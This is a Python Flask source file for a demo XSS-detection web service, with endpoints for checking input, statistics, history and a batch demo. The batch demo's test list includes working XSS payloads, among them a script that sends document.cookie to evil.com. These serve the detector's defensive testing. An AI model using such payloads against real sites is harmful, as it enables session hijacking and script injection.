"""
GNN-DQN-MAFS XSS Firewall - Windows Server Demo
=================================================
Interactive web application for real-time XSS detection.
Open in browser: http://localhost:5000

Usage:
    conda activate XSS_GNN_DQN
    python app.py
"""

from flask import Flask, request, jsonify, render_template
from datetime import datetime
import sys
import os
import time

# Setup paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DEPLOY_DIR = os.path.dirname(SCRIPT_DIR)
PROJECT_ROOT = os.path.dirname(DEPLOY_DIR)
sys.path.insert(0, SCRIPT_DIR)
sys.path.insert(0, PROJECT_ROOT)

# Import detection engine from local firewall_service
from firewall_service import detect_xss, load_model, MODEL, XSS_PATTERNS

app = Flask(__name__)

# ── Session State ──
detection_history = []
session_stats = {
    'total_checks': 0,
    'blocked': 0,
    'safe': 0,
    'start_time': datetime.now()
}


# ══════════════════════════════════════════════════════════════════
# Web Pages
# ══════════════════════════════════════════════════════════════════

@app.route('/')
def index():
    """Main page - serves the interactive detection UI."""
    return render_template('index.html')


# ══════════════════════════════════════════════════════════════════
# API Endpoints
# ══════════════════════════════════════════════════════════════════

@app.route('/api/check', methods=['POST'])
def api_check():
    """Check a single text input for XSS."""
    data = request.get_json() or {}
    text = data.get('text', '').strip()

    if not text:
        return jsonify({'error': 'No text provided'}), 400

    start = time.time()
    result = detect_xss(text)
    elapsed_ms = (time.time() - start) * 1000

    # Add to history
    entry = {
        'input_preview': text[:80] + '...' if len(text) > 80 else text,
        'is_xss': result['is_xss'],
        'score': result['score'],
        'risk_level': result['risk_level'],
        'method': result['method'],
        'patterns': result['patterns'],
        'pattern_score': result['pattern_score'],
        'ml_score': result['ml_score'],
        'elapsed_ms': round(elapsed_ms, 1),
        'timestamp': datetime.now().isoformat()
    }

    detection_history.insert(0, entry)
    if len(detection_history) > 100:
        detection_history.pop()

    # Update stats
    session_stats['total_checks'] += 1
    if result['is_xss']:
        session_stats['blocked'] += 1
    else:
        session_stats['safe'] += 1

    return jsonify(entry)


@app.route('/api/stats', methods=['GET'])
def api_stats():
    """Get session statistics."""
    total = session_stats['total_checks']
    uptime = datetime.now() - session_stats['start_time']
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)

    return jsonify({
        'total_checks': total,
        'blocked': session_stats['blocked'],
        'safe': session_stats['safe'],
        'block_rate': round(session_stats['blocked'] / total * 100, 1) if total > 0 else 0,
        'model_loaded': MODEL is not None,
        'detection_method': 'DL Detection' if MODEL else 'Pattern Detection',
        'pattern_count': len(XSS_PATTERNS),
        'uptime': f'{hours:02d}:{minutes:02d}:{seconds:02d}'
    })


@app.route('/api/history', methods=['GET'])
def api_history():
    """Get recent detection history."""
    return jsonify({'history': detection_history[:50]})


@app.route('/api/health', methods=['GET'])
def api_health():
    """Health check."""
    return jsonify({
        'status': 'healthy',
        'model_loaded': MODEL is not None,
        'patterns': len(XSS_PATTERNS)
    })


@app.route('/api/batch-demo', methods=['POST'])
def api_batch_demo():
    """Run a demo suite of 10 test cases."""
    demo_payloads = [
        {"text": "Hello World, welcome to our website", "type": "safe"},
        {"text": "Search for Python tutorials", "type": "safe"},
        {"text": "Contact email: user@example.com", "type": "safe"},
        {"text": "Order #12345 shipped successfully", "type": "safe"},
        {"text": "Version 3.2.1 released", "type": "safe"},
        {"text": "<script>alert('XSS')</script>", "type": "xss"},
        {"text": "<script>document.location='http://evil.com/?c='+document.cookie</script>", "type": "xss"},
        {"text": "<img src=x onerror=alert(1)>", "type": "xss"},
        {"text": "<svg onload=alert('XSS')>", "type": "xss"},
        {"text": "eval(atob('YWxlcnQoMSk='))", "type": "xss"},
    ]

    results = []
    for payload in demo_payloads:
        start = time.time()
        result = detect_xss(payload['text'])
        elapsed_ms = (time.time() - start) * 1000

        entry = {
            'input_preview': payload['text'][:80],
            'is_xss': result['is_xss'],
            'score': result['score'],
            'risk_level': result['risk_level'],
            'method': result['method'],
            'patterns': result['patterns'],
            'pattern_score': result['pattern_score'],
            'ml_score': result['ml_score'],
            'elapsed_ms': round(elapsed_ms, 1),
            'timestamp': datetime.now().isoformat()
        }

        detection_history.insert(0, entry)
        session_stats['total_checks'] += 1
        if result['is_xss']:
            session_stats['blocked'] += 1
        else:
            session_stats['safe'] += 1

        results.append(entry)

    if len(detection_history) > 100:
        del detection_history[100:]

    return jsonify({'results': results, 'count': len(results)})


# ══════════════════════════════════════════════════════════════════
# Main
# ══════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    load_model()
    print("=" * 60)
    print("  GNN-DQN-MAFS XSS Detection - Windows Demo")
    print("=" * 60)
    print(f"  Model loaded: {MODEL is not None}")
    print(f"  Detection patterns: {len(XSS_PATTERNS)}")
    print(f"  Open in browser: http://localhost:5000")
    print("=" * 60)

    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
